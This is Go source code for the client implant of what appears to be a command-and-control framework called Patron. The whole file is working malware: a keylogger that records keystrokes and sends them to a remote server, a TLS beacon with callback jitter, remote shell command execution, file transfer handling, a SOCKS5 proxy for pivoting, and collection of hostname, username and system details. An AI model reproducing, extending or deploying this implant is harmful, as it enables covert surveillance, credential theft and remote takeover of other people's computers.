package main

import (
	"context"
	"crypto/tls"
	"encoding/gob"
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"github.com/MarinX/keylogger"
	"github.com/PatronC2/Patron/client/client_utils"
	"github.com/PatronC2/Patron/lib/logger"
	"github.com/PatronC2/Patron/types"
	"github.com/armon/go-socks5"
)

var (
	ServerIP          string
	ServerPort        string
	CallbackFrequency string
	CallbackJitter    string
	RootCert          string
	LoggingEnabled    string
	cache             string
)

type ProxyServer struct {
	server   *socks5.Server
	listener net.Listener
	wg       sync.WaitGroup
	cancel   context.CancelFunc
}

func main() {
	client_utils.Initialize(LoggingEnabled)
	config, err := client_utils.LoadCertificate(RootCert)
	if err != nil {
		log.Fatalf("Failed to load certificate: %v\n", err)
	}

	keyboard := keylogger.FindKeyboardDevice()
	k, err := keylogger.New(keyboard)
	if err != nil {
		logger.Logf(logger.Error, "Error starting keylogger: %v", err)
		return
	}
	logger.Logf(logger.Debug, "Started keylogger")
	defer k.Close()
	events := k.Read()

	go func() {
		for e := range events {
			switch e.Type {
			case keylogger.EvKey:
				if e.KeyPress() {
					cache = cache + e.KeyString()
				}
				if e.KeyRelease() {
					cache = cache + e.KeyString()
				}
				break
			}
		}
	}()

	agentID, hostname, username := client_utils.GenerateAgentMetadata()
	logger.Logf(logger.Info, "Created AgentID: %v. Hostname: %v. Username: %v", agentID, hostname, username)
	osType, osArch, osVersion, cpus, memory := client_utils.GetOSInfo()

	for {
		beacon, encoder, decoder, err := client_utils.EstablishConnection(config, ServerIP, ServerPort)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		logger.Logf(logger.Info, "Beacon connected")

		ip := client_utils.GetLocalIP(beacon)
		if err := handleConfigurationRequest(beacon, encoder, decoder, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory); err != nil {
			client_utils.HandleError(beacon, "configuration", err)
			continue
		}

		if err := client_utils.HandleFileRequest(beacon, encoder, decoder, agentID); err != nil {
			client_utils.HandleError(beacon, "file", err)
			continue
		}

		if err := handleCommandRequest(beacon, encoder, decoder, agentID); err != nil {
			client_utils.HandleError(beacon, "command", err)
			continue
		}

		if err := handleKeysRequest(beacon, encoder, decoder, agentID); err != nil {
			client_utils.HandleError(beacon, "keylogs", err)
			continue
		}

		beacon.Close()
		logger.Logf(logger.Info, "Beacon successful")
		time.Sleep(time.Second * time.Duration(client_utils.CalculateSleepInterval(CallbackFrequency, CallbackJitter)))
	}
}

func handleConfigurationRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory string) error {
	configReq := createConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cpus, memory, username, ip)
	if err := client_utils.SendRequest(encoder, types.ConfigurationRequestType, configReq); err != nil {
		return err
	}

	var response types.Response
	if err := decoder.Decode(&response); err != nil {
		return err
	}

	if response.Type == types.ConfigurationResponseType {
		if configResponse, ok := response.Payload.(types.ConfigurationResponse); ok {
			updateClientConfig(configResponse)
		} else {
			return fmt.Errorf("unexpected payload type")
		}
	} else {
		return fmt.Errorf("unexpected response type: %v", response.Type)
	}
	return nil
}

func createConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cpus, memory, username, ip string) types.ConfigurationRequest {
	return types.ConfigurationRequest{
		AgentID:           agentID,
		Username:          username,
		Hostname:          hostname,
		OSType:            osType,
		OSArch:            osArch,
		OSBuild:           osVersion,
		CPUS:              cpus,
		MEMORY:            memory,
		AgentIP:           ip,
		ServerIP:          ServerIP,
		ServerPort:        ServerPort,
		CallbackFrequency: CallbackFrequency,
		CallbackJitter:    CallbackJitter,
		MasterKey:         "MASTERKEY",
	}
}

func updateClientConfig(config types.ConfigurationResponse) {
	updateConfigField(&ServerIP, config.ServerIP, "callback IP")
	updateConfigField(&ServerPort, config.ServerPort, "callback port")
	updateConfigField(&CallbackFrequency, config.CallbackFrequency, "callback frequency")
	updateConfigField(&CallbackJitter, config.CallbackJitter, "callback jitter")
}

func updateConfigField(current *string, new, fieldName string) {
	if *current != new {
		logger.Logf(logger.Info, "Updating %s", fieldName)
		*current = new
	}
}

func handleCommandRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
	logger.Logf(logger.Info, "Fetching commands to run")

	for {
		if err := client_utils.SendRequest(encoder, types.CommandRequestType, types.CommandRequest{AgentID: agentID}); err != nil {
			return err
		}
		var response types.Response
		if err := decoder.Decode(&response); err != nil {
			return fmt.Errorf("error decoding command response: %v", err)
		}
		if response.Type == types.CommandResponseType {
			if commandResponse, ok := response.Payload.(types.CommandResponse); ok {
				commandResult := types.CommandStatusRequest{}
				if commandResponse.CommandType == "shell" {
					commandResult = executeAndReportCommand(beacon, encoder, commandResponse)
				} else if commandResponse.CommandType == "socks" {
					_, err := startSocks5Proxy(beacon, encoder, commandResponse)
					if err == nil {
						goto Exit
					}
					logger.Logf(logger.Done, "Started SOCKS5 proxy")
				}

				if commandResult.CommandResult == "2" {
					goto Exit
				}
			} else {
				return fmt.Errorf("unexpected payload type for CommandResponse")
			}
		} else {
			return fmt.Errorf("unexpected response type: %v, expected CommandResponseType", response.Type)
		}
		if err := decoder.Decode(&response); err != nil {
			return fmt.Errorf("error decoding command status response: %v", err)
		}
		if response.Type == types.CommandStatusResponseType {
			if commandStatusResponse, ok := response.Payload.(types.CommandStatusResponse); ok {
				logger.Logf(logger.Info, "Server received command success message: %v", commandStatusResponse)
			} else {
				return fmt.Errorf("unexpected payload type for CommandStatusResponse")
			}
		} else {
			return fmt.Errorf("unexpected response type: %v, expected CommandStatusResponseType", response.Type)
		}
	}
Exit:
	return nil
}

func startSocks5Proxy(beacon *tls.Conn, encoder *gob.Encoder, commandResponse types.CommandResponse) (*ProxyServer, error) {
	port := commandResponse.Command
	conf := &socks5.Config{}
	server, err := socks5.New(conf)
	if err != nil {
		return nil, fmt.Errorf("failed to create SOCKS5 server: %v", err)
	}
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		return nil, fmt.Errorf("failed to start listener on port %d: %v", port, err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	proxy := &ProxyServer{
		server:   server,
		listener: listener,
		cancel:   cancel,
	}
	proxy.wg.Add(1)
	go func() {
		defer proxy.wg.Done()
		logger.Logf(logger.Info, "SOCKS5 proxy server started on port %d", port)
		if err := server.Serve(listener); err != nil && ctx.Err() == nil {
			logger.Logf(logger.Error, "error while running proxy server: %v", err)
		}
	}()
	return proxy, nil
}

func (p *ProxyServer) StopProxy() {
	log.Println("Stopping SOCKS5 proxy server...")
	p.cancel()
	p.listener.Close()
	p.wg.Wait()
	log.Println("SOCKS5 proxy server stopped.")
}

func executeAndReportCommand(beacon *tls.Conn, encoder *gob.Encoder, instruct types.CommandResponse) types.CommandStatusRequest {
	commandResult := executeCommandRequest(&instruct)
	client_utils.SendRequest(encoder, types.CommandStatusRequestType, commandResult)
	return commandResult
}

func executeCommandRequest(instruct *types.CommandResponse) types.CommandStatusRequest {
	if instruct.Command == "" && instruct.CommandType == "" {
		logger.Logf(logger.Info, "No command to execute.")
		return types.CommandStatusRequest{CommandResult: "2"}
	}

	var CmdOut, result string
	switch instruct.CommandType {
	case "shell":
		CmdOut, result = client_utils.RunShellCommand(instruct.Command), "1"
	case "kill":
		CmdOut, result = "~Killed~", "1"
	default:
		result = "2"
	}

	return types.CommandStatusRequest{
		AgentID:       instruct.AgentID,
		CommandID:     instruct.CommandID,
		CommandResult: result,
		CommandOutput: CmdOut,
	}
}

func handleKeysRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
	logger.Logf(logger.Info, "Sending keylogs: %v", cache)
	keyResponse := types.KeysRequest{
		AgentID: agentID,
		Keys:    cache,
	}

	if err := client_utils.SendRequest(encoder, types.KeysRequestType, keyResponse); err != nil {
		return err
	}
	var response types.Response
	if err := decoder.Decode(&response); err != nil {
		return fmt.Errorf("error decoding command response: %v", err)
	}
	cache = ""

	return nil
}
